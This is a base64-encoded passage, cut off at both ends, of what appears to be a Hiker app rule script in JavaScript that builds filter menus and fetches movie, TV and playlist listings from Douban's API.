udD48L2I+JztcXHJcXG4gICAgICAgICAgICAgICAgfVxcclxcbiAgICAgICAgICAgICAgICBcXHJcXG4gICAgICAgICAgICAgICAgdXJsID0gJCh0ZW1wLmN1c3RvbVllYXIsICfnm7TmjqXovpPlhaXlhbfkvZPlubTku70s5L6L5aaCMjAwMCcpLmlucHV0KCgpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignY2xhc3NsaXN0JykpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgaWYoaW5wdXQubGVuZ3RoID09IDQpe1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRlbXAuY3VzdG9tWWVhciA9IGlucHV0O1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRlbXAueWVhciA9IFxcXCLoh6rlrprkuYnlubTku71cXFwiO1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXCJjbGFzc2xpc3RcXFwiLCBKU09OLnN0cmluZ2lmeSh0ZW1wKSk7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICAgICAgICAgICAgICB9ZWxzZXtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v6K+35q2j56Gu6L6T5YWlJ1xcclxcbiAgICAgICAgICAgICAgICAgICAgfVxcclxcbiAgICAgICAgICAgICAgICB9KTtcXHJcXG4gICAgICAgICAgICB9ZWxzZSBpZihpdGVtc1tpdGVtXVtpXSA9PSBcXFwi6Ieq5a6a5LmJ5Zyw5Yy6XFxcIil7XFxyXFxuICAgICAgICAgICAgICAgIGlmKHRlbXAubG9jYWwgPT0gXFxcIuiHquWumuS5ieWcsOWMulxcXCIpe1xcclxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGUgPSAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+6Ieq5a6a5LmJ5Zyw5Yy6OicgKyB0ZW1wLmN1c3RvbUxvY2FsICsgJyA8L2ZvbnQ+PC9iPic7XFxyXFxuICAgICAgICAgICAgICAgIH1cXHJcXG4gICAgICAgICAgICAgICAgXFxyXFxuICAgICAgICAgICAgICAgIHVybCA9ICQodGVtcC5jdXN0b21Mb2NhbCwgJ+ebtOaOpei+k+WFpeWFt+S9k+WcsOWMuizkvovlpoLkuK3lm73lpKfpmYYnKS5pbnB1dCgoKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2NsYXNzbGlzdCcpKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGlmKGlucHV0Lmxlbmd0aCA+IDApe1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRlbXAuY3VzdG9tTG9jYWwgPSBpbnB1dDtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICB0ZW1wLmxvY2FsID0gXFxcIuiHquWumuS5ieWcsOWMulxcXCI7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImNsYXNzbGlzdFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXHJcXG4gICAgICAgICAgICAgICAgICAgIH1lbHNle1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/or7fmraPnoa7ovpPlhaUnXFxyXFxuICAgICAgICAgICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgICAgIH0pO1xcclxcbiAgICAgICAgICAgIH1lbHNlIGlmKGl0ZW1zW2l0ZW1dW2ldID09IFxcXCLoh6rlrprkuYnnsbvlnotcXFwiKXtcXHJcXG4gICAgICAgICAgICAgICAgaWYodGVtcC50eXBlID09IFxcXCLoh6rlrprkuYnnsbvlnotcXFwiKXtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlID0gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPuiHquWumuS5ieexu+WeizonICsgdGVtcC5jdXN0b21UeXBlICsgJyA8L2ZvbnQ+PC9iPic7XFxyXFxuICAgICAgICAgICAgICAgIH1cXHJcXG4gICAgICAgICAgICAgICAgXFxyXFxuICAgICAgICAgICAgICAgIHVybCA9ICQodGVtcC5jdXN0b21UeXBlLCAn55u05o6l6L6T5YWl5YW35L2T57G75Z6LLOS+i+WmguWJp+aDhScpLmlucHV0KCgpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignY2xhc3NsaXN0JykpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgaWYoaW5wdXQubGVuZ3RoID4gMCl7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgdGVtcC5jdXN0b21UeXBlID0gaW5wdXQ7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgdGVtcC50eXBlID0gXFxcIuiHquWumuS5ieexu+Wei1xcXCI7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImNsYXNzbGlzdFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXHJcXG4gICAgICAgICAgICAgICAgICAgIH1lbHNle1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/or7fmraPnoa7ovpPlhaUnXFxyXFxuICAgICAgICAgICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgICAgIH0pO1xcclxcbiAgICAgICAgICAgIH1lbHNlIGlmKGl0ZW1zW2l0ZW1dW2ldID09IFxcXCLoh6rlrprkuYnmoIfnrb5cXFwiKXtcXHJcXG4gICAgICAgICAgICAgICAgaWYodGVtcC5jbGFzcyA9PSBcXFwi6Ieq5a6a5LmJ5qCH562+XFxcIil7XFxyXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZSA9ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz7oh6rlrprkuYnmoIfnrb46JyArIHRlbXAuY3VzdG9tQ2xhc3MgKyAnIDwvZm9udD48L2I+JztcXHJcXG4gICAgICAgICAgICAgICAgfVxcclxcbiAgICAgICAgICAgICAgICBcXHJcXG4gICAgICAgICAgICAgICAgdXJsID0gJCh0ZW1wLmN1c3RvbUNsYXNzLCAn55u05o6l6L6T5YWl5YW35L2T5qCH562+LOS+i+Wmgue7j+WFuFxcXFxu5Y+v5YaZ5aSa5Liq5qCH562+LOS9v+eUqFxcXCLoi7HmlofpgJflj7dcXFwi5YiG6ZqUJykuaW5wdXQoKCkgPT4ge1xcclxcbiAgICAgICAgICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdjbGFzc2xpc3QnKSk7XFxyXFxuICAgICAgICAgICAgICAgICAgICBpZihpbnB1dC5sZW5ndGggPiAwKXtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICB0ZW1wLmN1c3RvbUNsYXNzID0gaW5wdXQ7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgdGVtcC5jbGFzcyA9IFxcXCLoh6rlrprkuYnmoIfnrb5cXFwiO1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXCJjbGFzc2xpc3RcXFwiLCBKU09OLnN0cmluZ2lmeSh0ZW1wKSk7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICAgICAgICAgICAgICB9ZWxzZXtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v6K+35q2j56Gu6L6T5YWlJ1xcclxcbiAgICAgICAgICAgICAgICAgICAgfVxcclxcbiAgICAgICAgICAgICAgICB9KTtcXHJcXG4gICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHRpdGxlLFxcclxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcclxcbiAgICAgICAgICAgICAgICB1cmw6IHVybFxcclxcbiAgICAgICAgICAgIH0pXFxyXFxuICAgICAgICB9XFxyXFxuICAgICAgICBhLnB1c2goe1xcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnYmxhbmtfYmxvY2snXFxyXFxuICAgICAgICB9KVxcclxcbiAgICB9XFxyXFxuXFxyXFxuICAgIGxldCByYW5rID0ge1xcclxcbiAgICAgICAg6buY6K6k5o6S5bqPOiBcXFwiVVxcXCIsXFxyXFxuICAgICAgICDng63luqY6IFxcXCJUXFxcIixcXHJcXG4gICAgICAgIOivhOWIhjogXFxcIlNcXFwiLFxcclxcbiAgICAgICAg5pe26Ze0OiBcXFwiUlxcXCJcXHJcXG4gICAgfVxcclxcbiAgICBmb3IgKGxldCByIGluIHJhbmspIHtcXHJcXG4gICAgICAgIGEucHVzaCh7XFxyXFxuICAgICAgICAgICAgdGl0bGU6IHRlbXAucmFuayA9PT0gcmFua1tyXSA/ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz4nICsgciArICcgPC9mb250PjwvYj4nIDogcixcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcclxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6IC8vZW1wdHkjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChlKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignY2xhc3NsaXN0JykpO1xcclxcbiAgICAgICAgICAgICAgICB0ZW1wLnJhbmsgPSBlO1xcclxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiY2xhc3NsaXN0XFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcclxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcclxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICAgICAgfSwgcmFua1tyXSlcXHJcXG4gICAgICAgIH0pXFxyXFxuICAgIH1cXHJcXG5cXHJcXG4gICAgYS5wdXNoKHtcXHJcXG4gICAgICAgIGNvbF90eXBlOiAnYmxhbmtfYmxvY2snXFxyXFxuICAgIH0pXFxyXFxuXFxyXFxuICAgIGxldCBmaWx0ZXIgPSB7XFxyXFxuICAgICAgICDlhajpg6jlvbHniYc6ICcnLFxcclxcbiAgICAgICAg5LuF5pyJ54mH5rqQOiAncGxheWFibGUnXFxyXFxuICAgIH1cXHJcXG4gICAgZm9yIChsZXQgciBpbiBmaWx0ZXIpIHtcXHJcXG4gICAgICAgIGEucHVzaCh7XFxyXFxuICAgICAgICAgICAgdGl0bGU6IHRlbXAuZmlsdGVyID09PSBmaWx0ZXJbcl0gPyAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+JyArIHIgKyAnIDwvZm9udD48L2I+JyA6IHIsXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXHJcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOiAvL2VtcHR5I25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZSkgPT4ge1xcclxcbiAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2NsYXNzbGlzdCcpKTtcXHJcXG4gICAgICAgICAgICAgICAgdGVtcC5maWx0ZXIgPSBlO1xcclxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiY2xhc3NsaXN0XFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcclxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcclxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICAgICAgfSwgZmlsdGVyW3JdKVxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfVxcclxcblxcclxcbiAgICBhLnB1c2goe1xcclxcbiAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz7or4TliIbljLrpl7Q6JyArIHRlbXAuc2NvcmUucmVwbGFjZSgnLCcsICctJykgKyAnIDwvZm9udD48L2I+JyxcXHJcXG4gICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxyXFxuICAgICAgICB1cmw6ICQodGVtcC5zY29yZS5yZXBsYWNlKCcsJywgJy0nKSwgJ+ivhOWIhuW6lOWcqDAtMTDkuYvpl7QnKS5pbnB1dCgoKSA9PiB7XFxyXFxuICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdjbGFzc2xpc3QnKSk7XFxyXFxuICAgICAgICAgICAgbGV0IGlucHV0cyA9IGlucHV0LnNwbGl0KCctJyk7XFxyXFxuICAgICAgICAgICAgaWYgKGlucHV0cy5sZW5ndGggPT0gMiAmJiBpbnB1dHMuZXZlcnkoZSA9PiBlID49IDAgJiYgZSA8PSAxMCkgJiYgcGFyc2VGbG9hdChpbnB1dHNbMF0pIDwgaW5wdXRzWzFdKSB7XFxyXFxuICAgICAgICAgICAgICAgIHRlbXAuc2NvcmUgPSBpbnB1dC5yZXBsYWNlKCctJywgJywnKTtcXHJcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImNsYXNzbGlzdFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXHJcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXHJcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcclxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/or7fmraPnoa7ovpPlhaUnXFxyXFxuICAgICAgICAgICAgfVxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfSlcXHJcXG5cXHJcXG4gICAgbGV0IHMgPSBnZXREb3ViYW5SZXMoXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvbW92aWUvdGFnP1xcXCJcXHJcXG4gICAgICAgICAgICArIChwYWdlID8gXFxcInN0YXJ0PVxcXCIgKyAocGFnZSAtIDEpICogY291bnRcXHJcXG4gICAgICAgICAgICArIFxcXCImY291bnQ9XFxcIiArIGNvdW50IDogXFxcInN0YXJ0PTAmY291bnQ9MzBcXFwiKVxcclxcbiAgICAgICAgICAgICsgXFxcIiZxPVxcXCIgKyB0ZW1wLnN1YnR5cGVcXHJcXG4gICAgICAgICAgICArIFxcXCIsXFxcIiArICh0ZW1wLmxvY2FsPT1cXFwi6Ieq5a6a5LmJ5Zyw5Yy6XFxcIiA/IHRlbXAuY3VzdG9tTG9jYWwgOiB0ZW1wLmxvY2FsKVxcclxcbiAgICAgICAgICAgICsgXFxcIixcXFwiICsgKHRlbXAudHlwZT09XFxcIuiHquWumuS5ieexu+Wei1xcXCIgPyB0ZW1wLmN1c3RvbVR5cGUgOiB0ZW1wLnR5cGUpXFxyXFxuICAgICAgICAgICAgKyBcXFwiLFxcXCIgKyAodGVtcC55ZWFyPT1cXFwi6Ieq5a6a5LmJ5bm05Lu9XFxcIiA/IHRlbXAuY3VzdG9tWWVhciA6IHRlbXAueWVhcilcXHJcXG4gICAgICAgICAgICArIFxcXCIsXFxcIiArICh0ZW1wLmNsYXNzPT1cXFwi6Ieq5a6a5LmJ5qCH562+XFxcIiA/IHRlbXAuY3VzdG9tQ2xhc3MgOiB0ZW1wLmNsYXNzKVxcclxcbiAgICAgICAgICAgICsgXFxcIiZzb3J0PVxcXCIgKyB0ZW1wLnJhbmsgKyBcXFwiJnNjb3JlX3JhbmdlPVxcXCIgKyB0ZW1wLnNjb3JlICsgJyZmaWx0ZXI9JyArIHRlbXAuZmlsdGVyKTtcXHJcXG4gICAgbGV0IGwgPSBzLmRhdGE7XFxyXFxuXFxyXFxuICAgIGxldCBkZXRhaWxzVmlld0NvbmZpZ3MgPSBnZXRDb25maWcoJ2RldGFpbHNWaWV3Q29uZmlncycpO1xcclxcbiAgICBsZXQgaSA9IGwubWFwKChlID0+IHtcXHJcXG4gICAgICAgIGxldCB0eXBlID0gZS50eXBlLFxcclxcbiAgICAgICAgICAgIGlkID0gZS5pZCxcXHJcXG4gICAgICAgICAgICB0aXRsZSA9IGUudGl0bGU7XFxyXFxuICAgICAgICBsZXQgdXNlQ29uZmlnID0gZGV0YWlsc1ZpZXdDb25maWdzW2RldGFpbHNWaWV3Q29uZmlncy51c2VdLmNvbmZpZztcXHJcXG4gICAgICAgIGxldCB1cmxQYXJhbXMgPSB7fTtcXHJcXG4gICAgICAgIGlmICh1c2VDb25maWcuc3RhcnRzV2l0aCgneycpKSB7XFxyXFxuICAgICAgICAgICAgZXZhbCgndXJsUGFyYW1zID0gJyArIHVzZUNvbmZpZyk7XFxyXFxuICAgICAgICB9IGVsc2Uge1xcclxcbiAgICAgICAgICAgIHVybFBhcmFtcy51cmwgPSAkKFxcXCJoaWtlcjovL2VtcHR5I25vSGlzdG9yeSMjaW1tZXJzaXZlVGhlbWUjXFxcIiArICc/dHlwZT0nICsgdHlwZSArICcmaWQ9JyArIGlkKS5ydWxlKCh0eXBlLCBpZCwgdGl0bGUsIHVzZUNvbmZpZykgPT4ge1xcclxcbiAgICAgICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxyXFxuICAgICAgICAgICAgICAgIGlmICh0eXBlID09PSBcXFwicGxheWxpc3RcXFwiKSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBkb3VMaXN0KGlkLCBNWV9QQUdFLCA1MCk7XFxyXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBldmFsKHVzZUNvbmZpZyk7XFxyXFxuICAgICAgICAgICAgICAgIH1cXHJcXG4gICAgICAgICAgICB9LCB0eXBlLCBpZCwgdGl0bGUsIHVzZUNvbmZpZyk7XFxyXFxuICAgICAgICB9XFxyXFxuICAgICAgICByZXR1cm4ge1xcclxcbiAgICAgICAgICAgIHRpdGxlOiB0aXRsZSxcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ21vdmllXzMnLFxcclxcbiAgICAgICAgICAgIHVybDogdXJsUGFyYW1zLnVybCxcXHJcXG4gICAgICAgICAgICBleHRyYTogdXJsUGFyYW1zLmV4dHJhLFxcclxcbiAgICAgICAgICAgIGltZzogZS5jb3Zlcl91cmwgKyBcXFwiQFJlZmVyZXI9XFxcIiArIGUuY292ZXJfdXJsLFxcclxcbiAgICAgICAgICAgIGRlc2M6IGUubnVsbF9yYXRpbmdfcmVhc29uIHx8IGUucmF0aW5nLnZhbHVlXFxyXFxuICAgICAgICB9XFxyXFxuICAgIH0pKTtcXHJcXG5cXHJcXG4gICAgcmV0dXJuIHBhZ2UgPiAxID8gaSA6IGEuY29uY2F0KGkpO1xcclxcbn1cXHJcXG5cXHJcXG4vL+eJh+WNlVxcclxcbmZ1bmN0aW9uIHBsYXlMaXN0KHBhZ2UsIGNvdW50KSB7XFxyXFxuICAgIGlmICghZ2V0TXlWYXIoJ3BsYXlsaXN0JykpIHB1dE15VmFyKCdwbGF5bGlzdCcsICd7XFxcInN1YnR5cGVcXFwiOlxcXCJcXFwiLFxcXCJ0eXBlXFxcIjpcXFwiYWxsXFxcIn0nKTtcXHJcXG4gICAgbGV0IGEgPSBbXTtcXHJcXG4gICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdwbGF5bGlzdCcsICd7XFxcInN1YnR5cGVcXFwiOlxcXCJcXFwiLFxcXCJ0eXBlXFxcIjpcXFwiYWxsXFxcIn0nKSk7XFxyXFxuICAgIGxldCBjb2xvciA9IGdldENvbmZpZygnY2hvb3NlQ29sb3InKTtcXHJcXG5cXHJcXG4gICAgbGV0IGl0ZW1zID0ge1xcclxcbiAgICAgICAgdHlwZToge1xcclxcbiAgICAgICAgICAgIOWFqOmDqDogXFxcImFsbFxcXCIsXFxyXFxuICAgICAgICAgICAg6LGG55Oj54mH5Y2VOiBcXFwib2ZmaWNpYWxcXFwiLFxcclxcbiAgICAgICAgICAgIOeyvumAiTogXFxcInNlbGVjdGVkXFxcIixcXHJcXG4gICAgICAgICAgICDnu4/lhbg6IFxcXCJjbGFzc2ljYWxcXFwiLFxcclxcbiAgICAgICAgICAgIOiOt+WlljogXFxcInByaXplXFxcIixcXHJcXG4gICAgICAgICAgICDpq5jliIY6IFxcXCJoaWdoX3Njb3JlXFxcIixcXHJcXG4gICAgICAgICAgICDmppzljZU6IFxcXCJtb3ZpZV9saXN0XFxcIixcXHJcXG4gICAgICAgICAgICDlhrfpl6jkvbPniYc6IFxcXCJkYXJrX2hvcnNlXFxcIixcXHJcXG4gICAgICAgICAgICDkuLvpopg6IFxcXCJ0b3BpY1xcXCIsXFxyXFxuICAgICAgICAgICAg5a+85ryUOiBcXFwiZGlyZWN0b3JcXFwiLFxcclxcbiAgICAgICAgICAgIOa8lOWRmDogXFxcImFjdG9yXFxcIixcXHJcXG4gICAgICAgICAgICDns7vliJc6IFxcXCJzZXJpZXNcXFwiLFxcclxcbiAgICAgICAgICAgIOWNjuivrTogXFxcImNoaW5lc2VcXFwiLFxcclxcbiAgICAgICAgICAgIOasp+e+jjogXFxcIndlc3Rlcm5cXFwiLFxcclxcbiAgICAgICAgICAgIOaXpeacrDogXFxcImphcGFuZXNlXFxcIixcXHJcXG4gICAgICAgICAgICDpn6nlm706IFxcXCJrb3JlYVxcXCIsXFxyXFxuICAgICAgICAgICAg5Zac5YmnOiBcXFwiY29tZWR5XFxcIixcXHJcXG4gICAgICAgICAgICDliqjkvZw6IFxcXCJhY3Rpb25cXFwiLFxcclxcbiAgICAgICAgICAgIOeIseaDhTogXFxcImxvdmVcXFwiLFxcclxcbiAgICAgICAgICAgIOenkeW5uzogXFxcInNjaWVuY2VfZmljdGlvblxcXCIsXFxyXFxuICAgICAgICAgICAg5Yqo55S7OiBcXFwiY2FydG9vblxcXCIsXFxyXFxuICAgICAgICAgICAg5oKs55aROiBcXFwibXlzdGVyeVxcXCIsXFxyXFxuICAgICAgICAgICAg5oOK5oKaOiBcXFwicGFuaWNcXFwiLFxcclxcbiAgICAgICAgICAgIOaBkOaAljogXFxcImhvcnJpYmxlXFxcIixcXHJcXG4gICAgICAgICAgICDniq/nvao6IFxcXCJjcmltaW5hbFxcXCIsXFxyXFxuICAgICAgICAgICAg5ZCM5oCnOiBcXFwibGdidFxcXCIsXFxyXFxuICAgICAgICAgICAg5oiY5LqJOiBcXFwid2FyXFxcIixcXHJcXG4gICAgICAgICAgICDlpYflubs6IFxcXCJmYW50YXN5XFxcIixcXHJcXG4gICAgICAgICAgICBcXFwiXFxcXHU2MGM1XFxcXHU4MjcyXFxcIjogXFxcImVyb3RpY2FcXFwiLFxcclxcbiAgICAgICAgICAgIOmfs+S5kDogXFxcIm11c2ljXFxcIixcXHJcXG4gICAgICAgICAgICDnuqrlvZXniYc6IFxcXCJkb2N1bWVudGFyeVxcXCIsXFxyXFxuICAgICAgICAgICAg5rK75oSIOiBcXFwiY3VyZVxcXCIsXFxyXFxuICAgICAgICAgICAg6Im65pyvOiBcXFwiYXJ0XFxcIixcXHJcXG4gICAgICAgICAgICDpu5HoibLlub3pu5g6IFxcXCJkYXJrX2h1bW9yXFxcIixcXHJcXG4gICAgICAgICAgICDpnZLmmKU6IFxcXCJ5b3V0aFxcXCIsXFxyXFxuICAgICAgICAgICAg5aWz5oCnOiBcXFwiZmVtYWxlXFxcIixcXHJcXG4gICAgICAgICAgICDnnJ/lrp7kuovku7bmlLnnvJY6IFxcXCJyZWFsX2V2ZW50XFxcIixcXHJcXG4gICAgICAgICAgICDmmrTlips6IFxcXCJ2aW9sZW5jZVxcXCIsXFxyXFxuICAgICAgICAgICAg6buR55m9OiBcXFwiYmxhY2tfd2hpdGVcXFwiLFxcclxcbiAgICAgICAgICAgIOe+jumjnzogXFxcImZvb2RcXFwiLFxcclxcbiAgICAgICAgICAgIOaXheihjDogXFxcInRyYXZlbFxcXCIsXFxyXFxuICAgICAgICAgICAg5YS/56ulOiBcXFwiY2hpbGRcXFwiLFxcclxcbiAgICAgICAgICAgIOS6uuaApzogXFxcImh1bWFuaXR5XFxcIixcXHJcXG4gICAgICAgICAgICDlrrbluq06IFxcXCJmYW1pbHlcXFwiLFxcclxcbiAgICAgICAgICAgIOaWh+iJujogXFxcImxpdGVyYXJ5X2FydFxcXCIsXFxyXFxuICAgICAgICAgICAg5bCP6K+05pS557yWOiBcXFwibm92ZWxcXFwiLFxcclxcbiAgICAgICAgICAgIOaEn+S6ujogXFxcIm1vdmluZ1xcXCIsXFxyXFxuICAgICAgICAgICAg5Yqx5b+XOiBcXFwiaW5zcGlyYXRpb25cXFwiXFxyXFxuICAgICAgICB9LFxcclxcbiAgICAgICAgc3VidHlwZToge1xcclxcbiAgICAgICAgICAgIOWFqOmDqDogXFxcIlxcXCIsXFxyXFxuICAgICAgICAgICAg55S15b2xOiBcXFwibW92aWVcXFwiLFxcclxcbiAgICAgICAgICAgIOeUteinhuWJpzogXFxcInR2XFxcIlxcclxcbiAgICAgICAgfVxcclxcbiAgICB9XFxyXFxuICAgIGZvciAobGV0IGkgaW4gaXRlbXMpIHtcXHJcXG4gICAgICAgIGZvciAobGV0IGogaW4gaXRlbXNbaV0pIHtcXHJcXG4gICAgICAgICAgICBhLnB1c2goe1xcclxcbiAgICAgICAgICAgICAgICB0aXRsZTogdGVtcFtpXSA9PT0gaXRlbXNbaV1bal0gPyAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+JyArIGogKyAnIDwvZm9udD48L2I+JyA6IGosXFxyXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxyXFxuICAgICAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHQpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcigncGxheWxpc3QnLCAne1xcXCJzdWJ0eXBlXFxcIjpcXFwiXFxcIixcXFwidHlwZVxcXCI6XFxcImFsbFxcXCJ9JykpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgdGVtcFt0WzBdXSA9IHRbMV07XFxyXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwicGxheWxpc3RcXFwiLCBKU09OLnN0cmluZ2lmeSh0ZW1wKSk7XFxyXFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcclxcbiAgICAgICAgICAgICAgICB9LCBbaSwgaXRlbXNbaV1bal1dKVxcclxcbiAgICAgICAgICAgIH0pXFxyXFxuICAgICAgICB9XFxyXFxuICAgICAgICBhLnB1c2goe1xcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwiYmxhbmtfYmxvY2tcXFwiXFxyXFxuICAgICAgICB9KVxcclxcbiAgICB9XFxyXFxuXFxyXFxuICAgIGxldCBzID0gZ2V0RG91YmFuUmVzKFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL3NreW5ldC9uZXdfcGxheWxpc3RzXFxcIiArIFxcXCI/Y2F0ZWdvcnk9XFxcIiArIHRlbXAudHlwZSArIFxcXCImc3ViamVjdF90eXBlPVxcXCIgKyB0ZW1wLnN1YnR5cGUgKyAocGFnZSA/IFxcXCImc3RhcnQ9XFxcIiArIChwYWdlIC0gMSkgKiBjb3VudCArIFxcXCImY291bnQ9XFxcIiArIGNvdW50IDogXFxcIiZzdGFydD0wJmNvdW50PTEwXFxcIikpO1xcclxcbiAgICBsZXQgbCA9IHMuZGF0YVswXS5pdGVtcztcXHJcXG5cXHJcXG4gICAgbGV0IGkgPSBsLm1hcCgoZSA9PiAoe1xcclxcbiAgICAgICAgdGl0bGU6IGUudGl0bGUsXFxyXFxuICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHkvJHBhZ2V7ZnlwYWdlfSNub0hpc3RvcnkjJykucnVsZSgodHlwZSwgaWQpID0+IHtcXHJcXG4gICAgICAgICAgICBldmFsKEpTT04ucGFy